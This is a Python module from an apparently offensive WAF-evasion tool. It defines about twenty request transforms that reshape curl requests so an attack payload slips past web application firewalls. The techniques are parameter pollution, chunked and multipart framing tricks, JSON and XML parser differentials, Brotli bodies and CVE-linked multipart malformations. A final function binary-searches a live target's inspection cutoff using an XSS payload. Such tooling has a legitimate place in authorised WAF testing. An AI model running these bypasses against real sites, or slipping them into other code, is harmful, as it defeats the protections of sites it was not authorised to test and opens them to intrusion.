"""Request-level transforms — an axis orthogonal to payload mutation.

A payload mutator rewrites the *string*. A RequestTransform rewrites the whole
*HTTP request*: where the payload sits, how the body is framed, which verb and
headers are used. Many real WAF bypasses are request-shape tricks (HTTP parameter
pollution, chunked/multipart framing, verb tampering, content-type confusion)
rather than payload encodings, so the search should be able to combine both axes.

Each transform exposes `.name`, `.desc`, and `.build(target, payload) -> list[str]`
returning a full curl argv (or None to fall back to the oracle's default).
"""
from __future__ import annotations

import json
import urllib.parse
from dataclasses import dataclass
from typing import Callable, Optional

from .brotli_raw import compress_stored
from .oracle import Target


@dataclass(frozen=True)
class RequestTransform:
    name: str
    desc: str
    _build: Callable[[Target, str], Optional[list]]
    # Optional: bytes to feed curl on stdin (for binary bodies that can't ride in
    # argv, e.g. a Brotli stream with NUL bytes). When set, the argv uses
    # `--data-binary @-` and the Oracle pipes these bytes per request — pure and
    # concurrency-safe, no temp files. See Oracle._curl_send.
    stdin_fn: Optional[Callable[[Target, str], bytes]] = None

    def build(self, target: Target, payload: str):
        return self._build(target, payload)

    def stdin(self, target: Target, payload: str) -> Optional[bytes]:
        return self.stdin_fn(target, payload) if self.stdin_fn is not None else None


def _base(t: Target) -> list[str]:
    return ["curl", t.curl_sec(), "-m", str(t.timeout),
            "-w", "\n%{http_code} %{size_download} %{time_total}",
            "-A", t.user_agent]


def _url(t: Target) -> str:
    return t.url()


# ----------------------------------------------------------------------------- transforms
def _identity(t: Target, payload: str):
    return None  # fall back to Oracle default injection


def _hpp_duplicate(t: Target, payload: str):
    # same param twice: a benign first value, the payload second (or vice-versa).
    url = _url(t)
    sep = "&" if "?" in url else "?"
    q = (urllib.parse.urlencode({t.param: "1"}) + "&" +
         urllib.parse.urlencode({t.param: payload}))
    return _base(t) + ["-X", t.method, f"{url}{sep}{q}"]


def _hpp_split(t: Target, payload: str):
    # split the payload across two instances of the same param (naive concat WAFs miss it)
    half = max(1, len(payload) // 2)
    a, b = payload[:half], payload[half:]
    url = _url(t)
    sep = "&" if "?" in url else "?"
    q = urllib.parse.urlencode({t.param: a}) + "&" + urllib.parse.urlencode({t.param: b})
    return _base(t) + ["-X", t.method, f"{url}{sep}{q}"]


def _chunked_body(t: Target, payload: str):
    # force chunked transfer encoding on a urlencoded body
    body = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/x-www-form-urlencoded",
                       "-H", "Transfer-Encoding: chunked",
                       "--data-binary", body]


def _multipart_body(t: Target, payload: str):
    # multipart/form-data framing; some WAFs parse this differently
    return _base(t) + ["-X", "POST", _url(t), "-F", f"{t.param}={payload}"]


def _json_body(t: Target, payload: str):
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/json",
                       "-d", json.dumps({t.param: payload})]


def _content_type_confusion(t: Target, payload: str):
    # send urlencoded bytes but label them application/json (parser mismatch)
    body = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _verb_override(t: Target, payload: str):
    # keep payload in query but use an unusual verb + override header
    url = _url(t)
    sep = "&" if "?" in url else "?"
    q = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "PUT", f"{url}{sep}{q}",
                       "-H", "X-HTTP-Method-Override: GET"]


def _charset_header(t: Target, payload: str):
    body = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/x-www-form-urlencoded; charset=ibm037",
                       "--data-binary", body]


def _brotli_body(t: Target, payload: str):
    # Body compressed with Content-Encoding: br. Many WAFs decompress only gzip/
    # deflate request bodies (or none), so a br body sails past content inspection
    # while a br-decoding backend still processes it — the compression blind spot
    # the Brotli "Node2Shell" work (CVE-2026-111497) turns into a decoder-reachability
    # primitive. The br stream has NUL bytes, so it can't ride in argv: the argv
    # says `--data-binary @-` and the actual bytes are piped on stdin (stdin_fn).
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/x-www-form-urlencoded",
                       "-H", "Content-Encoding: br",
                       "--data-binary", "@-"]


def _brotli_stdin(t: Target, payload: str) -> bytes:
    # the exact bytes for _brotli_body's `@-`: brotli(urlencode(param=payload)).
    body = urllib.parse.urlencode({t.param: payload}).encode()
    return compress_stored(body)


def _junk_prefix_param_build(t: Target, payload: str, size: int):
    # large benign parameter before the payload — some WAFs stop inspecting after N bytes
    url = _url(t)
    sep = "&" if "?" in url else "?"
    pad = urllib.parse.urlencode({"padding": "A" * size})
    q = pad + "&" + urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", t.method, f"{url}{sep}{q}"]


def _junk_prefix_param(t: Target, payload: str):
    return _junk_prefix_param_build(t, payload, 8000)


def junk_prefix_param_sized(size: int) -> RequestTransform:
    """Factory: `junk_prefix_param` with a caller-chosen padding `size` (bytes)
    instead of the hardcoded 8000 default.

    Not auto-registered in TRANSFORMS — its size varies per call, so a caller
    (e.g. `find_inspection_cutoff` below, or a CLI sweep across sizes) builds
    one on demand: `junk_prefix_param_sized(20000).build(target, payload)`.
    The plain `junk_prefix_param` entry in TRANSFORMS (8000 bytes) is kept
    as-is for backward compatibility.
    """
    def _build(t: Target, payload: str):
        return _junk_prefix_param_build(t, payload, size)
    return RequestTransform(f"junk_prefix_param_{size}",
                             f"huge benign param ({size}B) before payload", _build)


# ---------------------------------------------------------------- D2 structural / parser-differential
# WAFFLED "split-brain": keep the payload un-obfuscated but distort the request
# ENVELOPE (multipart/JSON/XML framing) so the WAF's body parser misses the field
# while the backend parser still extracts the payload. A whole bypass class that
# needs no payload encoding at all.
def _json_dup_key(t: Target, payload: str):
    k = json.dumps(t.param)
    body = "{" + f'{k}:"ok",{k}:{json.dumps(payload)}' + "}"  # last-key-wins differential
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _json_unicode_key(t: Target, payload: str):
    uk = '"' + "".join(f"\\u{ord(c):04x}" for c in t.param) + '"'  # key the WAF won't match literally
    body = "{" + f"{uk}:{json.dumps(payload)}" + "}"
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _json_array_wrap(t: Target, payload: str):
    body = json.dumps({t.param: [payload]})  # scalar-vs-array parser differential
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "-d", body]


def _json_nested_junk(t: Target, payload: str):
    body = "{" + f'"_":{{"a":1,"b":[1,2,3]}},{json.dumps(t.param)}:{json.dumps(payload)}' + "}"
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _mp_dup_disposition(t: Target, payload: str):
    b = "----WAFFENb0undary"
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="decoy"\r\n'
            f'Content-Disposition: form-data; name="{t.param}"\r\n\r\n'
            f"{payload}\r\n--{b}--\r\n")  # two dispositions: which one each parser honours differs
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
                       "--data-binary", body]


def _mp_filename_confusion(t: Target, payload: str):
    b = "----WAFFENb0undary"
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="{t.param}"; filename="x"\r\n\r\n'
            f"{payload}\r\n--{b}--\r\n")  # name+filename: some WAFs treat it as a file upload and skip it
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
                       "--data-binary", body]


def _mp_boundary_whitespace(t: Target, payload: str):
    # declared boundary has trailing space the WAF may keep but the server trims
    b = "----WAFFENb0undary"
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="{t.param}"\r\n\r\n'
            f"{payload}\r\n--{b}--\r\n")
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f'Content-Type: multipart/form-data; boundary="{b} "',
                       "--data-binary", body]


def _mp_truncated(t: Target, payload: str):
    # Truncated multipart: NO closing --boundary-- and no trailing CRLF. A
    # vulnerable Coraza (<=3.8.0, CVE-2026-41508) hits io.ErrUnexpectedEOF,
    # treats it as benign, never raises MULTIPART_STRICT_ERROR (rules 200002/
    # 200003 stay silent) and drops the part — while tolerant backend parsers
    # still extract the field. A pure parser-fail-open differential.
    b = "----WAFFENb0undary"
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="{t.param}"\r\n\r\n'
            f"{payload}")  # intentionally unterminated: no trailing \r\n--{b}--
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
                       "--data-binary", body]


def _mp_filename_rfc2231(t: Target, payload: str):
    # RFC 2231 extended parameter: the WAF inspects the plain filename="decoy.txt"
    # and misses the payload carried (percent-encoded) in filename*=UTF-8''...,
    # which RFC 2231-aware backends decode and honour (CVE-2026-104269).
    b = "----WAFFENb0undary"
    enc = urllib.parse.quote(payload, safe="")
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="{t.param}"; '
            f"filename=\"decoy.txt\"; filename*=UTF-8''{enc}\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"{payload}\r\n--{b}--\r\n")
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
                       "--data-binary", body]


def _xml_body(t: Target, payload: str):
    esc = (payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
    body = f'<?xml version="1.0"?><root><{t.param}>{esc}</{t.param}></root>'
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/xml",
                       "--data-binary", body]


# ---------------------------------------------------------------- GoTestWAF-parity placeholder
# A minimal, generic GraphQL envelope. Not a parser-differential trick like the
# D2 structural set above — just a new wire FORMAT some WAF rule sets don't
# inspect as deeply as plain JSON/form bodies (closes a GoTestWAF-parity gap).
def _graphql_body(t: Target, payload: str):
    # fixed minimal envelope: "q" here is the GraphQL variable name declared by
    # the query string ($q), not t.param — a generic placeholder shape, not a
    # per-target field-name mapping like the other transforms.
    body = json.dumps({
        "query": "query Probe($q: String) { search(q: $q) { id } }",
        "variables": {"q": payload},
    })
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "-d", body]


TRANSFORMS: list[RequestTransform] = [
    RequestTransform("identity", "default injection (no request reshaping)", _identity),
    RequestTransform("hpp_duplicate", "duplicate param: benign then payload", _hpp_duplicate),
    RequestTransform("hpp_split", "split payload across two same-name params", _hpp_split),
    RequestTransform("chunked_body", "POST body with Transfer-Encoding: chunked", _chunked_body),
    RequestTransform("multipart_body", "multipart/form-data framing", _multipart_body),
    RequestTransform("json_body", "application/json body", _json_body),
    RequestTransform("content_type_confusion", "urlencoded bytes labelled as JSON", _content_type_confusion),
    RequestTransform("verb_override", "PUT + X-HTTP-Method-Override", _verb_override),
    RequestTransform("charset_header", "exotic charset in Content-Type", _charset_header),
    RequestTransform("brotli_body", "Content-Encoding: br body (WAF br-decompression blind spot, CVE-2026-111497)",
                     _brotli_body, stdin_fn=_brotli_stdin),
    RequestTransform("junk_prefix_param", "huge benign param before payload", _junk_prefix_param),
    # D2 structural / parser-differential (WAFFLED split-brain)
    RequestTransform("json_dup_key", "duplicate JSON key (last-wins differential)", _json_dup_key),
    RequestTransform("json_unicode_key", "unicode-escaped JSON key name", _json_unicode_key),
    RequestTransform("json_array_wrap", "payload as a JSON array value", _json_array_wrap),
    RequestTransform("json_nested_junk", "payload after nested JSON junk", _json_nested_junk),
    RequestTransform("mp_dup_disposition", "multipart: two Content-Disposition lines", _mp_dup_disposition),
    RequestTransform("mp_filename_confusion", "multipart: name + filename on one part", _mp_filename_confusion),
    RequestTransform("mp_boundary_whitespace", "multipart: trailing space in boundary", _mp_boundary_whitespace),
    RequestTransform("mp_truncated", "multipart truncated before closing boundary (Coraza CVE-2026-41508)", _mp_truncated),
    RequestTransform("mp_filename_rfc2231", "multipart RFC 2231 filename* smuggling (CVE-2026-104269)", _mp_filename_rfc2231),
    RequestTransform("xml_body", "payload inside an XML element", _xml_body),
    RequestTransform("graphql_body", "minimal GraphQL query+variables envelope", _graphql_body),
]
# transforms that reshape the request STRUCTURE (parser-differential), a distinct axis
STRUCTURAL = {"json_dup_key", "json_unicode_key", "json_array_wrap", "json_nested_junk",
              "mp_dup_disposition", "mp_filename_confusion", "mp_boundary_whitespace", "xml_body",
              "mp_truncated", "mp_filename_rfc2231"}

# extra placeholder wire-formats that aren't parser-differential tricks (not
# STRUCTURAL) — just new envelope shapes some WAF rule sets inspect less
# thoroughly than classic form/JSON bodies.
PLACEHOLDER_EXTRA = {"graphql_body"}

BY_NAME = {t.name: t for t in TRANSFORMS}


def get(name: str) -> RequestTransform:
    return BY_NAME[name]


def select(names: set[str] | None = None) -> list[RequestTransform]:
    if not names:
        return list(TRANSFORMS)
    expanded: set[str] = set()
    for n in names:
        if n == "all":
            return list(TRANSFORMS)
        if n == "structural":
            expanded |= STRUCTURAL
        elif n == "placeholder_extra":
            expanded |= PLACEHOLDER_EXTRA
        else:
            expanded.add(n)
    return [t for t in TRANSFORMS if t.name in expanded]


# ---------------------------------------------------------------- nowafpls++ live cutoff probe
# `junk_prefix_param`/`junk_prefix_param_sized` above *apply* the nowafpls
# padding trick at a fixed, guessed size. This finds the REAL cutoff against a
# live target by binary search, so a caller can pick a padding size that is
# known to work instead of a guess from BODY_LIMITS (see recon/fingerprint.py).
def find_inspection_cutoff(oracle, param: str = "padding", *, lo: int = 0, hi: int = 131072,
                            probes: int = 12,
                            signature_payload: str = "<script>alert(1)</script>") -> int | None:
    """Binary-search a live target's real body/query-inspection cutoff.

    nowafpls-style probe: for a given padding size, sends `lo`..`hi` bytes of
    benign filler followed by a known-bad `signature_payload`, as ONE opaque
    string — `("A" * pad_size) + "&" + urlencode({param: signature_payload})`
    — passed to `oracle.send(...)` exactly like any other candidate payload
    (whatever inject mode the oracle's Target is already configured with). If
    the padding pushes the signature past the WAF's inspection window, the
    verdict flips from BLOCKED to THROUGH even though the origin still sees
    (and would act on) the full request.

    `oracle` is duck-typed: anything with `.send(payload) -> obj-with-.verdict`
    works — a real `waffen.core.oracle.Oracle`, or a lightweight test stub.
    This function does not require Target/Oracle to support a dedicated
    "padding size" inject mode; it only ever calls the single public
    `oracle.send(payload)` entry point.

    Runs a classic binary search for the smallest pad size whose verdict is
    THROUGH, assuming the usual monotonic cutoff (BLOCKED below it, THROUGH
    at/above it). Spends at most `probes` oracle.send() calls TOTAL, strictly
    enforced via a counter local to this call (independent of
    `oracle.requests` or any other traffic the oracle may already carry) —
    if the budget is exhausted before the search fully converges, the best
    (smallest confirmed-THROUGH) size found so far is returned.

    Returns the smallest pad size (bytes) where the verdict flips to THROUGH,
    or None if it never flips within `hi`, or no probe budget is available.
    """
    sent = 0

    def probe(pad_size: int) -> bool:
        nonlocal sent
        sent += 1
        payload = ("A" * pad_size) + "&" + urllib.parse.urlencode({param: signature_payload})
        # compared against the literal string (not imported from .oracle) so this
        # stays fully duck-typed: any oracle-like object with `.send(p).verdict`
        # works, including a plain test stub that never touches oracle.py.
        return oracle.send(payload).verdict == "THROUGH"

    if probes <= 0 or hi < lo:
        return None

    if not probe(hi):
        return None  # never flips within [lo, hi] (or no inspection cutoff at all)

    best = hi
    low, high = lo, hi
    while sent < probes and low < high:
        mid = low + (high - low) // 2
        if probe(mid):
            best = mid
            high = mid
        else:
            low = mid + 1

    return best
